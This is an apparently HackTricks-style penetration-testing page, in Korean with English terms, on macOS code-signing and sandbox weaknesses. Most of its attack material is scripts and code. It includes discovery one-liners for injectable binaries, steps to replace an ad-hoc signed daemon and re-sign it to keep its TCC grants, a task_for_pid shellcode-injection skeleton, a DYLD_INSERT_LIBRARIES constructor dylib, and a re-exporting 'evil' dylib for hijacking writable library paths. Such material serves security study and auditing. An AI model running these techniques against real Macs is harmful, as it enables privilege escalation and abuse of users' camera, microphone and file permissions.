# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Basic Information

**Ad-hoc signing** (`CS_ADHOC`)은 **certificate chain**이 없는 code signature를 생성합니다. 즉, developer identity verification 없이 code의 hash만 포함됩니다. 따라서 해당 binary의 출처를 어떤 developer나 organization으로도 추적할 수 없습니다.<sup>[[1]](#references)[[4]](#references)</sup>

Apple Silicon Mac에서는 모든 executable에 최소한 ad-hoc signature가 필요합니다. 따라서 많은 development tools, Homebrew packages 및 third-party utilities에서 ad-hoc signature를 확인할 수 있습니다.

### Why This Matters

- **검증 가능한 identity 없음** — identity-based checks로 탐지되지 않고 binary를 교체할 수 있음
- **privileged positions**(FDA, daemon, helpers)에 있는 third-party ad-hoc binaries는 우선순위가 높은 targets임
- 일부 configurations에서는 ad-hoc signatures가 developer-signed code만큼 엄격하게 **검증되지 않을 수 있음**
- **TCC grants**가 있는 ad-hoc signed binaries는 특히 가치가 높음 — binary content가 변경되어도 grants가 유지됨(TCC가 grant를 key로 지정한 방식에 따라 다름)

### Discovery
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Attack: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## Debuggable Processes (get-task-allow)

### 기본 정보

**`com.apple.security.get-task-allow`** entitlement(또는 `CS_GET_TASK_ALLOW` flag)은 **모든 process가 debugger로 attach**하여 memory를 읽고, register를 수정하고, code를 inject하며, execution을 제어할 수 있도록 허용합니다.<sup>[[3]](#references)</sup>

이는 **development build에만** 사용하도록 설계되었습니다. 그러나 일부 third-party binary는 production 환경에서도 이 entitlement를 포함한 채 배포됩니다.

> [!CAUTION]
> `get-task-allow`가 적용된 production binary는 **즉시 exploitation primitive**입니다. 모든 local process는 `task_for_pid()`를 호출하고, 대상의 Mach task port를 획득한 다음, 대상의 entitlement, TCC grant 및 security context로 실행되는 arbitrary code를 inject할 수 있습니다.

### Discovery
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### 공격: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Library Validation 없음 + DYLD Environment

### Runtime Library-Validation 해제

private entitlement **`com.apple.private.security.clear-library-validation`**은 process launch 시 library validation을 disable하지 않습니다. 대신 process가 runtime에 자체적으로 `csops(..., CS_OPS_CLEAR_LV, ...)`를 호출할 수 있도록 허용합니다. XNU는 caller가 해당 entitlement를 보유하고 handler의 추가 검사를 충족하면 `CS_REQUIRE_LV | CS_FORCED_LV`를 clear합니다. 따라서 process는 library validation을 clear하는 code path에 도달한 후에만 실행 가능한 library-injection target이 될 수 있습니다.<sup>[[4]](#references)[[5]](#references)</sup>

### 치명적인 조합

binary에 다음 두 항목이 **모두** 있을 때:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (모든 dylib 로드)
- `com.apple.security.cs.allow-dyld-environment-variables` (DYLD env vars 허용)

이는 **보장된 code injection primitive**입니다 — `DYLD_INSERT_LIBRARIES`가 완벽하게 동작합니다.

### Discovery
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Attack: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Sandbox 임시 예외

### Sandbox를 약화시키는 방식

Sandbox 임시 예외(`com.apple.security.temporary-exception.*`)는 App Sandbox에 허점을 만듭니다:<sup>[[2]](#references)</sup>

| 예외 | 허용되는 작업 |
|---|---|
| `temporary-exception.mach-lookup.global-name` | 시스템 전체의 XPC/Mach 서비스에 연결 |
| `temporary-exception.files.absolute-path.read-write` | 앱 컨테이너 외부의 파일 읽기/쓰기 |
| `temporary-exception.iokit-user-client-class` | IOKit user-client 연결 열기 |
| `temporary-exception.shared-preference.read-only` | 다른 앱의 preference 읽기 |
| `temporary-exception.files.home-relative-path.read-write` | `~` 기준 경로에 접근 |

### Mach-Lookup 예외 = Sandbox Escape Primitive

가장 위험한 예외는 **mach-lookup**입니다. 이 예외를 사용하면 Sandbox된 앱이 권한이 높은 daemon과 통신할 수 있습니다:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### 공격: Mach-Lookup을 통한 Sandbox Escape
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Private Apple Entitlements

### 정의

`com.apple.private.*`가 접두사로 붙은 Entitlements는 third-party developer에게 문서화되거나 제공되지 않는 **Apple 내부 API**에 대한 access를 제공합니다. Private Entitlements를 보유한 third-party binary는 enterprise cert, MDM 또는 non-App-Store distribution을 통해 이를 획득합니다.

### 위험한 Private Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | TCC database 전체 read/write |
| `com.apple.private.tcc.allow` | 특정 TCC service에 대한 access |
| `com.apple.private.security.no-sandbox` | sandbox 없이 실행 |
| `com.apple.private.iokit` | IOKit driver에 대한 직접 access |
| `com.apple.private.kernel.\*` | Kernel interface access |
| `com.apple.private.xpc.launchd.job-label` | launchd job 등록/관리 |
| `com.apple.rootless.install` | SIP로 보호되는 path에 write |

### 발견
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Custom Sandbox Profiles (SBPL)

### 이것이 무엇인가

바이너리는 SBPL(Seatbelt Profile Language)로 작성된 **custom sandbox profiles**와 함께 제공될 수 있습니다. 이러한 profile은 기본 App Sandbox보다 더 제한적일 수도 있고, OR **더 permissive**할 수도 있습니다.

### Custom Profiles 감사하기
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## 쓰기 가능한 Library 경로

### 이것이 무엇인가

바이너리가 현재 사용자가 **쓸 수 있는** 경로에서 dynamic library를 로드하면, 해당 library를 악성 코드로 교체할 수 있습니다.

### 탐색
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Attack: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Code Signing 가이드](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (`CS_OPS_*` 작업 및 `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (`csops` / `CS_OPS_CLEAR_LV` handler)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
{{#include ../../../banners/hacktricks-training.md}}
